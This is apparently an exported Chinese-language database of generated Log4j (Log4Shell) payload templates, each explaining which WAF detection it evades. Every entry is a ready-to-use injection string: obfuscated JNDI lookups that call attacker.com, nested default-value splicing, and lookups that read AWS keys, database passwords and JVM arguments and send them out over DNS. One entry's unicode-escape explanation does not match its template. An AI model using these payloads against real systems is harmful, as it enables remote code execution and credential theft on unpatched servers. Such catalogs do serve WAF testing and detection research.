### `log4j2:lookup:ctx_default_splice` — ${ctx:} 默认值逐字符拼接协议关键字

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：ctx(线程上下文)是 WAF 白名单里最不易拦截的非 jndi lookup；引用不存在的上下文键会触发 `:-` 默认值机制回退输出指定字符，从而在语义层拼出 jndi/ldap 等关键字，绕过针对字面量正则的检测，且不出现 env:/sys: 等常见被封前缀。
- **模板**：`${j${ctx:EMPTY:-n}di:l${ctx:EMPTY:-d}ap://attacker.com/a}`
- **来源备注**：`${j${ctx:EMPTY:-n}di:l${ctx:EMPTY:-d}ap://attacker.com/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `log4j2:lookup:date_char_build` — ${date:'j'} 日期格式逐字母构造 jndi

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：date lookup 的格式串经 SimpleDateFormat 解析，单引号包裹的字母按字面量原样输出，即 `${date:'j'}`→j。用一个最无害、最可能被白名单放行的 lookup 类型把 jndi/ldap 逐字符拼出，绕的是任何"拦 jndi: 或 ldap:// 字面量"的正则/字符串签名，语义折叠后仍为同一 JNDI URL。
- **模板**：`${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://attacker.com/a}`
- **来源备注**：`${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://attacker.com/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `log4j2:lookup:date_lookup` — date 查表

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${date:'j'}` 日期格式字符拼接关键字。
- **模板**：`${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker/z}`
- **来源备注**：`${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `log4j2:lookup:date_url_fragment` — date lookup 藏进 JNDI URL 碎片位破坏签名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：把 `${date:...}` 内嵌到 jndi:ldap:// 之后，URL 以 # 注释碎片收尾。WAF 若用"ldap:// 后必须跟权威域/IP"或对连续 jndi:ldap://host 串做正则，内层 date 先被求值成日期串拼接进 URL，使整条字符串不再匹配检测签名；Log4j 端 LDAP 仍解析该 URL(碎片不参与连接)。cloudflare 观测到 date 是真实在野的规避原语。
- **模板**：`${jndi:ldap://127.0.0.1#${date:'MM-dd-yyyy'}}`
- **来源备注**：`${jndi:ldap://127.0.0.1#${date:'MM-dd-yyyy'}}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:deep_nesting` — 深嵌套递归

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`substitute()` 无限递归，WAF 单层匹配在多层级嵌套下失手。
- **模板**：`${${lower:${upper:jn}}di:ldap://attacker/z}`、`${${lower:${upper:jn}}${::-di}:ldap://attacker/z}`、`${${::-${::-$${::-j}}}}`
- **来源备注**：`${${lower:${upper:jn}}di:ldap://attacker/z}`、`${${lower:${upper:jn}}${::-di}:ldap://attacker/z}`、`${${::-${::-$${::-j}}}}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:docker_k8s_special` — docker:/k8s: 专有 lookup 泄露容器元数据

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：docker: 返回容器 containerId/containerName/imageId/imageName/shortContainerId/shortImageId；k8s: 读 Kubernetes 主节点配置（Cloudflare 明确列出 Docker/Kubernetes/Spring 的专用 lookup 被用于从目标进程环境外带数据，含用户、home、镜像名、数据库密码、主机名）。WAF 极少覆盖这两个前缀，是不含 jndi: 的泄露/标记探测向量。
- **模板**：`${docker:containerId}.${docker:imageName}`、`${jndi:dns://${docker:imageName}.attacker.com/x}`、`${j${k8s:k5:-ND}i:l${k8s:k5:-D}ap://attacker.com/a}`
- **来源备注**：`${docker:containerId}.${docker:imageName}`、`${jndi:dns://${docker:imageName}.attacker.com/x}`、`${j${k8s:k5:-ND}i:l${k8s:k5:-D}ap://attacker.com/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:dotless_i` — 无点 ı 归一化

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：U+0131（无点小写 ı）经 `${upper:ı}` → `I`，`jnd${upper:ı}` 运行时拼出 `jndi`。WAF 正则若只匹配 `jndi` 字面量则失手。
- **模板**：`${jnd${upper:ı}:ldap://attacker/z}`、`${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}`
- **来源备注**：`${jnd${upper:ı}:ldap://attacker/z}`、`${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:empty_default` — 空串默认值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${::-j}` 展开为空串的默认值 `j`，逐字符拼出关键字。
- **模板**：`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker/z}`
- **来源备注**：`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:env_cloud_keys` — 云/容器密钥环境变量定向 [检索·INCIBE/Akamai]

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：定向读挂在 pod 环境变量里的密钥（K8s serviceaccount token、AWS/GCP key）——`${env:AWS_SECRET_ACCESS_KEY}` 在 WAF 词过滤器下配合嵌套混淆仍可读出（Puliczek PoC 实证）。
- **模板**：`${env:AWS_SECRET_ACCESS_KEY}`、`${env:KUBERNETES_SERVICE_HOST}`、`${${lower:e}nv:PATH}`
- **来源备注**：`${env:AWS_SECRET_ACCESS_KEY}`、`${env:KUBERNETES_SERVICE_HOST}`、`${${lower:e}nv:PATH}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:env_default` — 环境变量默认值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${env:NOTEXIST:-j}` 未存在变量取默认值 `j`。
- **模板**：`${jnd${env:EMPTY:-i}:ldap://attacker/z}`、`${${env:ENV:-j}ndi${env:ENV:-:}...}`
- **来源备注**：`${jnd${env:EMPTY:-i}:ldap://attacker/z}`、`${${env:ENV:-j}ndi${env:ENV:-:}...}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:event_default_prefix` — ${event:} 事件键默认值+无前缀双层混淆

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：event lookup 的键取日志事件自身字段，几乎必缺，`:-` 默认值必然触发；更关键是第二层——连 event 前缀本身也拿 `:-`/`::-` 无前缀 lookup 打散，形成两层嵌套。语义引擎即使识别出顶层使用了非 jndi lookup，也无法在浅层解析中还原出完整的 jndi 目标。
- **模板**：`${${:-e}${::-v}${what:ever:-n}:whatever:-j}ndi:ldap://attacker.com/a`
- **来源备注**：`${${:-e}${::-v}${what:ever:-n}:whatever:-j}ndi:ldap://attacker.com/a`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:exotic_protocol` — 冷门协议变体

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：JNDI 除 ldap 还支持 rmi/dns/iiop/java，WAF 黑名单常只含 ldap。
- **模板**：`${jndi:rmi://attacker/z}`、`${jndi:dns://attacker/z}`、`${jndi:iiop://attacker/z}`、`${jndi:ldaps://attacker/z}`
- **来源备注**：`${jndi:rmi://attacker/z}`、`${jndi:dns://attacker/z}`、`${jndi:iiop://attacker/z}`、`${jndi:ldaps://attacker/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:hash_fragment` — # 绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${jndi:ldap://127.0.0.1#attacker.com/z}`——URI.getHost() 取 # 前值，LDAP 连接全主机名（绕 2.15 部分检查）。
- **模板**：`${jndi:ldap://127.0.0.1#attacker.com/z}`
- **来源备注**：`${jndi:ldap://127.0.0.1#attacker.com/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:info_disclosure` — 非 JNDI 信息泄露 lookup

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`bundle`/`java`/`sys`/`ctx`/`env` lookup 直接读敏感数据，WAF 对非 jndi 前缀覆盖弱。
- **模板**：`${bundle:application:spring.datasource.password}`、`${java:version}`、`${java:os}`、`${env:OS}`
- **来源备注**：`${bundle:application:spring.datasource.password}`、`${java:version}`、`${java:os}`、`${env:OS}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:ip_bracket` — 方括号 IP

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：[192.168.34.96] 方括号 IP 形态绕过点分 IP 正则。
- **模板**：`${jndi:ldap://[192.168.34.96]/a}`、`${jndi:ldap:192.168.1.1:/a}`
- **来源备注**：`${jndi:ldap://[192.168.34.96]/a}`、`${jndi:ldap:192.168.1.1:/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:ipv6_mapped` — IPv6 映射地址混淆

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 IPv6 映射 IPv4 形式 [0:0:0:0:0:ffff:127.0.0.1] 表示回环地址，WAF 若只匹配点分 IPv4 字面量会漏过目标地址黑名单
- **模板**：`${jndi:ldap://[0:0:0:0:0:ffff:127.0.0.1]/a}`
- **来源备注**：`${jndi:ldap://[0:0:0:0:0:ffff:127.0.0.1]/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:k8s_default_splice` — ${k8s:} Kubernetes lookup 键缺失默认值拼接字符

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：k8s lookup 返回容器元数据，运行时按 k8s 命名空间键查询；引用不存在的键(如 k5)时 lookup 值为空、触发 `:-` 默认值输出 ND，从而把 jn+NDi 拼回 jndi。攻击串里不含 jndi 字面量，且 k8s: 前缀在绝大多数 WAF 的混淆前缀清单之外，专门用来打语义引擎对容器 lookup 族的覆盖空白。
- **模板**：`${j${k8s:k5:-ND}i:l${k8s:k5:-D}ap://attacker.com/a}`
- **来源备注**：`${j${k8s:k5:-ND}i:l${k8s:k5:-D}ap://attacker.com/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:log4j_hostname_java` — log4j:/hostName/java: 元数据 lookup 无 jndi 探测与指纹

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：log4j:configLocation/log4j:configParentLocation 回显 log4j2.xml 绝对路径；${hostName} 回显主机名；java: 变体回显 JVM 环境（version/runtime/vm/os/locale/hw），官方文档称 java 是预格式化字符串。三者前缀几乎从不在 WAF 拦截名单中。攻击者用它们在日志里做存活/指纹/路径泄露，或把元数据塞进 jndi:dns 外带 DNS 通道。
- **模板**：`${log4j:configParentLocation}`、`${hostName}.${java:os}.${java:version}`、`${jndi:dns://${hostName}.${java:version}.attacker.com/x}`
- **来源备注**：`${log4j:configParentLocation}`、`${hostName}.${java:os}.${java:version}`、`${jndi:dns://${hostName}.${java:version}.attacker.com/x}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:lower_upper` — 大小写 lookup

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${lower:j}` 运行时产出 `j`，WAF 的 `jndi` 连续匹配被打断。
- **模板**：`${${lower:j}ndi:${lower:l}dap://attacker/z}`、`${${upper:j}NDI:${upper:l}DAP://ATTACKER/z}`、`${j${lower:n}di:l${lower:d}ap://attacker/z}`
- **来源备注**：`${${lower:j}ndi:${lower:l}dap://attacker/z}`、`${${upper:j}NDI:${upper:l}DAP://ATTACKER/z}`、`${j${lower:n}di:l${lower:d}ap://attacker/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:main_args_exfil` — main: lookup 回显 JVM 启动命令行参数

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：main: 是 MainMapLookup，读取应用 main 方法参数（需 MainMapLookup.setMainArguments 注入，Cloudflare 在野观测确认 ${main:0} 按索引取参）。WAF 常见规则不含 main: 前缀。攻击者在日志消息里嵌套 ${main:0}.${main:1}... 可把程序启动参数（含 DB/云凭据、URL、密钥）逐段带出，配合 DNS/日志通道外带。
- **模板**：`${main:0}.${main:1}.${main:2}`、`${jndi:ldap://host/${main:1}.${main:2}}`
- **来源备注**：`${main:0}.${main:1}.${main:2}`、`${jndi:ldap://host/${main:1}.${main:2}}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:map_default_splice` — ${map:} 键默认值拼接 jndi 前缀

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：与 ctx 同族的 map lookup 在日志中用于读取 StructuredData/MapMessage；对不存在的键走 `:-` 默认值机制输出字符，把 jndi 逐字拼回。关键点：WAF 的语义引擎若只对 env:/sys:/lower:/upper: 等已知混淆前缀做归一化，map: 不在清单内，形成前缀枚举盲区。
- **模板**：`${jndi:${map:NOPE:-l}d${map:NOPE:-a}p://attacker.com/a}`
- **来源备注**：`${jndi:${map:NOPE:-l}d${map:NOPE:-a}p://attacker.com/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:non_exist_lookup` — 非存在 lookup

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${${what:ever:-j}...}`——Log4j 求值默认值而不管 lookup 是否存在。
- **模板**：`${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://attacker/z}`
- **来源备注**：`${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://attacker/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:nonstandard_port` — 非标准端口规避

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 1389/4444 等非默认端口运行 JNDI 服务，WAF 若对标准 ldap 端口(389/636)建模会漏过非标端口（2025 实测 37% 被拦攻击用非标端口）
- **模板**：`${jndi:ldap://attacker.com:4444/a}`、`${jndi:rmi://attacker.com:10999/a}`
- **来源备注**：`${jndi:ldap://attacker.com:4444/a}`、`${jndi:rmi://attacker.com:10999/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:spring_extra` — Spring lookup 在日志消息中回显环境属性

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：spring: 是 log4j-spring-boot 集成为 Spring Environment 提供的 lookup。多数 WAF 只盯着 jndi:/ctx:/env:/sys: 前缀，不会拦截 spring:。若日志配置通过 ${spring:...} 引用 Spring 属性，且该属性可被攻击者影响的配置值污染，可作为 JNDI 之外的解析入口；同时攻击者可在日志内容中构造 ${spring:prop} 探测 Spring 配置信息（信息泄露向量）。注意 lookup 只在 PatternLayout 事件求值阶段解析，需 appender 使用含 ${} 的 pattern 或配置属性。
- **模板**：`${spring:spring.application.name}`、`${spring:log.root.dir}`、`${spring:any.property.key}`
- **来源备注**：`${spring:spring.application.name}`、`${spring:log.root.dir}`、`${spring:any.property.key}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:sys_default` — 系统属性默认值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${sys:SYS_NAME:-i}` 系统属性不存在时取默认值 `i`，链式拼关键字。
- **模板**：`${jnd${sys:SYS_NAME:-i}:ldap://attacker/z}`、`${jnd${sys:LDAP:-i}:${sys:LDAP:-l}dap://attacker/z}`
- **来源备注**：`${jnd${sys:SYS_NAME:-i}:ldap://attacker/z}`、`${jnd${sys:LDAP:-i}:${sys:LDAP:-l}dap://attacker/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:sys_default_splice` — ${sys:} 不存在系统属性默认值拼接 jndi

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用不存在的系统属性名触发 `:-` 默认值回退输出单个字符，把 jndi 协议名拼回。与 env: 区别在于系统属性(System.getProperty) 由 JVM -D 定义、WAF 无法枚举；当语义引擎已把 env:/lower:/upper: 纳入归一化清单时，sys: 组合常不在覆盖范围内，形成前缀枚举盲区。
- **模板**：`${jnd${sys:SYS_NAME:-i}:l${sys:SYS_NAME:-d}ap://attacker.com/z}`
- **来源备注**：`${jnd${sys:SYS_NAME:-i}:l${sys:SYS_NAME:-d}ap://attacker.com/z}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:url_space_after` — URL 尾随空格

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${jndi:ldap://127.0.0.1:9999/ test}` 在 URL 后加空格——绕过 2.15.0-rc1 的关键字校验修复。
- **模板**：`${jndi:ldap://127.0.0.1:1389/ test}`
- **来源备注**：`${jndi:ldap://127.0.0.1:1389/ test}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:web_default_splice` — ${web:} ServletContext 属性默认值拼接关键字

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：web lookup 读取 ServletContext init-parameter，是 web 容器场景下的合法 lookup 类型，绝大多数 WAF 规则集根本不把它列入混淆前缀清单。利用不存在的属性名触发 `:-` 默认值回退，逐字符重建 ldap:// 等协议串，绕的是基于 lookup 前缀白名单/黑名单的语义归一化检测。
- **模板**：`${jndi:${web:NOT_SET:-l}dap://attacker.com/a}`
- **来源备注**：`${jndi:${web:NOT_SET:-l}dap://attacker.com/a}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:misc:json_unicode_dollar` — JSON 解析层 ${ 转义藏 ${

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：绕的是在原始字节/请求体里搜索 `${` 序列的检测：Jackson/fastjson 等 JSON 库支持 `\uXXXX` 与 `\xXX` 转义，请求体写成 `{"k":"${jndi:ldap://..."}` 时 WAF 看到的物理字节不含 `${`，但应用反序列化后 Log4j 拿到的是还原出的 `${jndi:...}`。属传输/编码层与后端解析器差异，语义引擎若先做多层级解码则可拦截。
- **模板**：`{"user":"${jndi:ldap://attacker.com/a}"}`
- **来源备注**：`{"user":"${jndi:ldap://attacker.com/a}"}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-
